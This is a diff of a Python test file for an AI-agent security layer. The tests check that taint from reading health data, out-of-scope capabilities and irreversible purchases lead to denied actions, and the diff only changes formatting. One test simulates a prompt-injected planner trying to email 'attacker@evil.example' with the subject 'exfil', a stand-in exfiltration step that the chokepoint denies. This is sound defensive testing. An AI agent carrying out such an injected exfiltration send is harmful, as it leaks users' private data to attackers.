@@ -115,7 +115,9 @@ async def test_oracle_memory_read_propagates_stored_label(tmp_path) -> None:
     session — the labeling rides through the read."""
     app = await _app(tmp_path)
     app.memory.write(
-        "labs", "WBC 7.2", LabelState(a=frozenset({CategoryTag("health", Tier.RESTRICTED)})),
+        "labs",
+        "WBC 7.2",
+        LabelState(a=frozenset({CategoryTag("health", Tier.RESTRICTED)})),
     )
     s = await _session(app)
     assert "health" not in _cats(app, s.id)
@@ -135,12 +137,16 @@ async def test_taint_read_health_then_external_email_denied(tmp_path) -> None:
     from the READ, not a seed."""
     app = await _app(tmp_path)
     app.memory.write(
-        "labs", "results", LabelState(a=frozenset({CategoryTag("health", Tier.RESTRICTED)})),
+        "labs",
+        "results",
+        LabelState(a=frozenset({CategoryTag("health", Tier.RESTRICTED)})),
     )
     s = await _session(app)
     await _call(app, s.id, "memory.read", {"key": "labs"})  # produces the taint
     out = await _call(
-        app, s.id, "email.send",
+        app,
+        s.id,
+        "email.send",
         {"to": "friend@ext.example", "subject": "x", "body": "y"},
     )
     assert out.decision.value == "deny"
@@ -194,7 +200,9 @@ async def test_injection_content_does_not_change_structural_outcome(tmp_path) ->
     # Simulate the planner being fully subverted — it tries the exact send
     # the injection demanded. The chokepoint denies regardless.
     out = await _call(
-        app, s.id, "email.send",
+        app,
+        s.id,
+        "email.send",
         {"to": "attacker@evil.example", "subject": "exfil", "body": "everything"},
     )
     assert out.decision.value == "deny"
@@ -215,10 +223,13 @@ async def test_confused_deputy_out_of_scope_pattern_denied(tmp_path) -> None:
     attenuated authority."""
     app = await _app(tmp_path)
     s = await _session(
-        app, caps=frozenset({Capability(kind=K.SEND_EMAIL, pattern="*@work.example")}),
+        app,
+        caps=frozenset({Capability(kind=K.SEND_EMAIL, pattern="*@work.example")}),
     )
     out = await _call(
-        app, s.id, "email.send",
+        app,
+        s.id,
+        "email.send",
         {"to": "stranger@elsewhere.example", "subject": "s", "body": "b"},
     )
     assert out.decision.value == "deny"
@@ -243,7 +254,9 @@ async def test_model_confidential_read_blocks_external_egress(tmp_path) -> None:
         with tempfile.TemporaryDirectory() as td:
             app = await _app(Path(td))
             app.memory.write(
-                "d", "v", LabelState(a=frozenset({CategoryTag(cat, Tier.RESTRICTED)})),
+                "d",
+                "v",
+                LabelState(a=frozenset({CategoryTag(cat, Tier.RESTRICTED)})),
             )
             s = await _session(app)
             await _call(app, s.id, reader, {"key": "d"})
@@ -285,7 +298,10 @@ async def test_sanctioned_declassification_lowers_taint_enabling_egress(tmp_path
         f.write_text("external content")
         await _call(app, s.id, "fs.read", {"path": str(f)})
         return await _call(
-            app, s.id, "email.send", {"to": "x@y.example", "subject": "s", "body": "b"},
+            app,
+            s.id,
+            "email.send",
+            {"to": "x@y.example", "subject": "s", "body": "b"},
         )
 
     # Raw read → untrusted taint → egress DENIED.
@@ -366,7 +382,8 @@ async def test_v2_purchase_keeps_irreversible_deny(tmp_path) -> None:
     DENY→override default (reversibility-irreversible), unlike email."""
     app, _ = await _real_config_app(tmp_path)
     s = await _session(
-        app, caps=frozenset({Capability(kind=K.QUEUE_PURCHASE, pattern="*", max_amount=999)}),
+        app,
+        caps=frozenset({Capability(kind=K.QUEUE_PURCHASE, pattern="*", max_amount=999)}),
     )
     out = await _call(app, s.id, "purchase.queue", {"vendor": "v", "item": "i", "amount": 9})
     assert out.decision.value == "deny"
